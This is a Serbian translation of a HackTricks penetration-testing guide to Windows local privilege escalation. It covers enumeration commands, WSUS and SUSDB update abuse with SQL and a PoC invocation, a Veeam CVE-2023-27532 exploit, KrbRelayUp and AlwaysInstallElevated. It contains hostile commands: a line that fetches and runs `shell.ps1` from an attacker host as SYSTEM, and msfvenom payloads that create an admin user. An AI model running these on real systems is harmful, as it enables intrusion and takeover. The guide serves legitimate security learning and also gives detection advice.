# Windows eskalacija lokalnih privilegija

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za eskalaciju lokalnih privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko temeljnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Njen praktični tok enumeracije zasniva se i na radionicama i kontrolnim listama zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata i DerbyCon prezentaciju o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Osnove Windows-a

### Tokeni pristupa

**Ako ne znate šta su tokeni pristupa u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Za više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima, pogledajte sledeću stranicu:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole Windows-a

U Windows-u postoje različiti mehanizmi koji vas mogu **sprečiti da enumerišete sistem**, pokrećete izvršne datoteke ili čak **otkriti vaše aktivnosti**. Pre nego što počnete sa enumeracijom za eskalaciju privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **proverite** sve ove **mehanizme odbrane**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup takođe može omogućiti da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema i lanac izmena memorije Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Zaštita administratora / tiha eskalacija UIAccess-a

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje nivoa High IL bez upita, ako se zaobiđu provere bezbedne putanje AppInfo. Pogledajte namenski postupak za zaobilaženje UIAccess/Admin Protection ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Širenje postavki pristupačnosti registra Secure Desktop-a može se zloupotrebiti za proizvoljan upis u registar kao SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i putanju za LPE preko **SMB proizvoljnog porta**, pri kojoj se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

Za lokalni inventar iz postojeće PowerShell sesije pogledajte [Windows enumeracija pomoću .NET-a](../basic-powershell-for-pentesters/dotnet-enumeration.md). Ovi primeri dopunjuju provere u nastavku, bez pokretanja zasebnih izvršnih datoteka za enumeraciju.

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti za verziju Windows-a (proverite i instalirane zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za određenu verziju

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju pruža Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas sadrži watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje OS build, instalirane ispravke i moguće kandidate iz odabranih bezbednosnih upozorenja; pre nego što rezultat smatrate primenljivim, proverite tačan proizvod i naknadne ispravke.

Za lokalni exploit specifičan za određenu verziju, proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windows-u, 32-bitni proces podleže [WOW64 preusmeravanju sistema datoteka](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično preusmerava na 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. OS build ili kandidat za nedostajući KB ne dokazuju da je sistem ranjiv; uporedite pokrenuti build, instaliranu ili naknadnu ispravku, arhitekturu procesa i preduslove exploita sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretan problem.

Primer oštećenja memorije servisa potražite u odeljku o [offsetima u MIDI prstenastom baferu deljene memorije koje kontroliše klijent](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Objavljeni offseti steka važe samo za testirani build; dobijanje naloga `LOCAL SERVICE` razlikuje se od narednog koraka [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md), kojim se dobija `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neke kredencijale ili Juicy informacije sačuvane u env promenljivama?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

Upisiv [PowerShell profil](../basic-powershell-for-pentesters/#powershell-profile-startup-injection) predstavlja zaseban trag za izvršavanje pri pokretanju; proverite da li privilegovaniji korisnik zaista učitava taj profil pre nego što ga smatrate načinom za eskalaciju.

### Datoteke PowerShell transkripata

Kako da ovo uključite možete saznati na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično zapisuje datoteke u fasciklu Documents svakog korisnika, ali podešavanje `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri datoteke u deljenu ili skrivenu fasciklu. Pre pregledanja transkripta proverite efektivnu putanju za izlaz i ACL datoteke: ona može da sadrži argumente komandi i izlaz, uključujući akreditive. Čitljiv transkript je samo trag ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Transcript files“ dokumentacije i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell evidencija, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se kompletna aktivnost i celokupan sadržaj izvršavanja skripte, čime se osigurava da se svaki blok koda dokumentuje tokom izvršavanja. Ovaj postupak čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenzičku analizu i analiziranje zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ranije smernice su rizik sažele na sledeći način:

Možete kompromitovati sistem ako se ažuriranja ne zahtevaju preko http**S**, već preko http.

HTTP WSUS endpoint je povod za proveru mogućeg presretanja metapodataka o ažuriranjima. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj, kao i od pravila klijenta za poverenje u ažuriranja i njihovu instalaciju. Sam URL ne dokazuje da je moguće izvršiti kod. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Za početak proverite da li mreža koristi WSUS ažuriranja bez SSL-a tako što ćete u cmd pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od ovih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Prvobitna izjava o primenljivosti glasila je:

Tada je **ranjivost moguće iskoristiti.** Ako je vrednost poslednjeg registra jednaka 0, unos za WSUS biće zanemaren.

Kada je `UseWUServer` podešen na `1`, Windows Update koristi konfigurisanu intranet uslugu. Ovo potvrđuje preduslov za putanju sa HTTP presretanjem, ali ne dokazuje da su presretanje, prihvatanje zlonamernog ažuriranja ili instalacija sa povišenim privilegijama mogući. Kada je podešen na `0`, ta konkretna WSUS krajnja tačka konfigurisana ovom smernicom nije izabrana.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su weaponized MiTM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji ne koristi SSL.

Istraživanje pročitajte ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Ceo izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Ukratko, ovo je propust koji ova greška iskorišćava:

> Ako možemo da izmenimo proxy podešavanja svog lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u postavkama Internet Explorera, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) kako bismo presreli sopstveni saobraćaj i pokrenuli kod kao korisnik sa povišenim privilegijama na svom sistemu.
>
> Pored toga, pošto WSUS usluga koristi postavke trenutnog korisnika, koristiće i njegovu skladišnu bazu sertifikata. Ako generišemo samopotpisani sertifikat za WSUS hostname i dodamo ga u skladišnu bazu sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme nalik HSTS-u za implementaciju provere poverenja pri prvom korišćenju sertifikata. Ako korisnik veruje predstavljenom sertifikatu i on ima ispravan hostname, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja kojima upravlja WSUS administrator

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sve delegirane WSUS dozvole, pa utvrdite koja grupa računara-klijenata treba da primi odobreno ažuriranje. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju, potvrdite da je potencijalno ažuriranje potpisano i prihvaćeno, primenljivo na cilj i instalirano u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju ispunjenost tih uslova.

### Zloupotreba prilagođenih ažuriranja SUSDB: nepotpisani payload-ovi preko `.txt`/`.esd`

Ovo je drugačiji propust granice poverenja od presretanja HTTP veze sa WSUS-om: preduslov je dovoljan pristup **uskladištenim procedurama WSUS baze podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način da se dođe do toga jeste prosleđivanje naloga računara WSUS servera ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; tačni preduslovi zavise od konkretne implementacije, zato prvo izlistajte `EXECUTE` dozvole umesto da pretpostavite da su potrebna prava SQL administratora.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja prosleđuje autentifikaciju WSUS klijenta sa HTTP/8530 ka LDAP-u, SMB-u ili AD CS-u pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potvrdite prosleđivanje ka eksternoj bazi podataka i prava za procedure

U implementacijama u kojima WSUS koristi eksterni SQL Server, prvo proverite da li nalog WSUS servera može da se autentifikuje na bazi podataka i da li NTLM relay može da dođe do tog listener-a. SQL uloga servera može da omogući procedure za objavljivanje ažuriranja čak i kada su direktni upisi u tabele zabranjeni; neuspešno izvršenje `UPDATE` nad `SUSDB` ne dokazuje da je objavljivanje onemogućeno. Pre pokušaja objavljivanja prilagođenog ažuriranja, u ovlašćenoj SQL sesiji proverite efektivni identitet, članstvo u ulogama i dozvole za procedure.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Definicije procedura uživo i instalirani `SoftwareDistributionPackage.xsd` korisni su pri rekonstrukciji ispravnih metapodataka ažuriranja. Nadređeni paket i podređeni payload moraju svaki da sadrže `UpdateIdentity` (tip fragmenta `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zabeležite lokalni ID revizije koji vraća svaki poziv `spImportUpdate` i uskladite odnos paketa, digest vrednosti, veličinu, URL sadržaja i reviziju. Ovo je tok objavljivanja sa stanjem, zato jedan uspešan poziv uskladištene procedure nije dokaz izvršavanja na strani klijenta.<sup>[[38]](#references)</sup>

#### Izgradnja, ciljanje i odobravanje ažuriranja

Tok rada za prilagođena ažuriranja koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvoz metapodataka ažuriranja | `spImportUpdate` |
| Čuvanje XML fragmenata za preduslove, lokalizovana i proširena svojstva | `spSaveXMLFragment` |
| Povezivanje digest vrednosti sadržaja sa URL-om koji kontroliše napadač | `spSetBatchURL` |
| Nabrajanje/kreiranje grupe računara i dodavanje klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobravanje instalacije za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, digest vrednosti, veličina i rukovalac `CommandLineInstallation` moraju biti usklađeni u uvezenim metapodacima/fragmentima. Nakon dodele URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda otprilike ovako; koristite nove identifikatore ažuriranja, grupe i implementacije umesto ponovnog korišćenja primera GUID vrednosti.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje potpisa zasnovano na ekstenziji

WSUS obično odbija proizvoljan nepotpisan izvršni sadržaj. Međutim, u `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, .NET putanja `VerifyFile` postavlja zastavicu provere sertifikata na false kada se ime prosleđene datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE, na primer nazvan `payload.exe.txt`, može da prođe proveru sadržaja i da ga kasnije pokrene rukovalac instalacijom iz komandne linije za ažuriranje. Ovo je greška u politici / zabuna tipova, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibilno postavljanje i automatizacija

Pozivom funkcije `spDeployUpdate` WSUS preuzima registrovani sadržaj. Izvor mora da ispuni HTTP zahteve koje postavlja BITS: samo dostupnost URL-a nije dovoljna, jer se prenos odvija kroz početni `HEAD`/`GET` tok i zahteve za opseg bajtova. Server bez podrške za Range izaziva WSUS grešku pri sinhronizaciji `EventId=364`, koja navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/grupa/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za postavljanje sadržaja. Minimalni primer poziva u ovlašćenom laboratorijskom okruženju je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Neinteraktivno izvršavanje i postojanost kroz ponovne pokušaje

Interakcija na strani klijenta zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema podešenom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije je ažuriranje ostalo neuspešno/nepotpuno ponovo je odmah ponuđen nakon izlaska callback procesa, pa ponašanje pri ponovnim pokušajima može postati trajnost kroz ponovljeno izvršavanje; pritom je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Tačke za detekciju i ojačavanje zaštite

Korisne tačke za proveru na serveru i klijentu u ovom lancu su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove grupe za ciljanje, spoljne izvore sadržaja, payload-e ažuriranja `.txt`/`.esd` i instalacije koje izvršavaju neočekivani principal-i (posebno nalozi koji nisu računarski).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; povežite verifikaciju sa ekstenzijom payloada i njegovim magic bytes, umesto da verujete sufiksu.
- Tražite ponovljene neuspehe/pokušaje instalacije Windows Update-a i PE izvršavanje ili neočekivanu aktivnost podređenih procesa/mreže za sadržaj sa imenima `.txt` ili `.esd`.
- Zahtevajte Extended Protection for Authentication za database service gde je podržano i ograničite mrežni pristup bazi podataka na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` prava na procedure za prilagođena ažuriranja na minimum i revidirajte ih.

## Auto-updater-i trećih strana i Agent IPC (lokalni privesc)

Mnogi enterprise agent-i izlažu IPC površinu na localhost-u i privilegovani kanal za ažuriranje. Ako je moguće navesti enrollment da se poveže sa attacker server-om, a updater veruje lažnom root CA-u ili ima slabe provere potpisnika, lokalni korisnik može da isporuči zlonamerni MSI koji SYSTEM servis instalira. Ovde pogledajte uopštenu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Prvobitni opis za konkretnu verziju i napomena o izviđanju bili su:

Veeam B&R < `11.0.1.1261` izlaže localhost servis na **TCP/9401** koji obrađuje poruke pod kontrolom napadača, omogućavajući izvršavanje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: potvrdite listener i verziju, npr. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni backup servis na **TCP/9401**. [Veeam-ovo obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva konfiguracione baze podataka unutar mrežnog perimetra za backup; zaseban javni PoC demonstrira putanju za izvršavanje komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može da se veže i na adrese izvan localhost-a, zato proverite njegovu stvarnu adresu i PID.

- **Recon**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` predstavljaju naznake, a ne potpunu proveru zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; prethodna izdanja su ranjiva. Sama četvorodelna verzija fajla ne može da razlikuje nezakrpanu osnovnu verziju od kasnije zakrpe na istom broju build-a. Pre nego što verziju na granici proglasite ispravljenom, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Exploit**: smestite PoC kao što je `VeeamHax.exe` i potrebne Veeam DLL-ove u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog socket-a:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis izvršava komandu kao SYSTEM.

Citirani PoC demonstrira izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.

## KrbRelayUp

Originalni opis podrazumevanog okruženja glasio je:

Ranjivost **lokalne eskalacije privilegija** postoji u Windows okruženjima **domena** pod određenim uslovima. Ti uslovi obuhvataju okruženja u kojima **LDAP signing nije nametnut**, korisnici imaju samostalna prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD)** i mogu da kreiraju računare u domenu. Važno je napomenuti da su ovi **zahtevi** ispunjeni uz korišćenje **podrazumevanih podešavanja**.

Lokalni Kerberos relay može da pređe sa prijave sa nižim privilegijama na privilegovano upisivanje u direktorijum kada se odgovarajući COM server autentifikuje, a prosleđeni principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) i LDAP upisivanja za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih putanja. RBCD lanac zahteva odgovarajuća prava za delegiranje i nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upisivanje ključa i KDC koji podržava putanju autentifikacije sertifikatom. Nijedna putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za prosleđeni identitet i nivoe autentifikacije i impersonacije izabrane COM klase. Bitni su tip prijave pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. Rezultat mogu da promene i rutiranje kroz firewall/OXID i instalirane ispravke. Permisivnu smernicu ili odgovarajući ACL smatrajte kandidatom za proveru; pasivna enumeracija ne bi trebalo da pokrene COM coercion, relay autentifikaciju niti upisivanja u direktorijum. Shadow credential računara može da dovede do machine ticket-a i, samo ako taj račun ima potrebna prava replikacije direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit na** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ove 2 vrednosti registra **omogućene** (vrednost je **0x1**), korisnici sa bilo kojim privilegijama mogu da **instaliraju** (izvršavaju) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

